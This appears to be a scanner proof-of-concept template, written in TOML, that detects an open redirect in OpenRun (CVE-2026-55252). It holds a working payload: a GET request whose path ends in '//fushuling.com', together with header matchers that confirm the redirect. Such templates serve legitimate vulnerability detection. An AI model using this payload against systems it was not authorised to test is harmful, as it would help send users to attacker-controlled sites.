[info]
author = "ave"
description = "检测 OpenRun 开放重定向漏洞：通过构造 //host 路径绕过 URL 校验，将用户重定向至外部恶意站点"
id = "POC-AVE-2026-0595"
name = "OpenRun Open Redirect PoC"
severity = "medium"
tags = ["ave-2026-0595"]
vuln_id = [
    "CVE-2026-55252",
    "AVE-2026-0595",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}//fushuling.com"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = [
    "//fushuling.com",
    "Location: //",
]
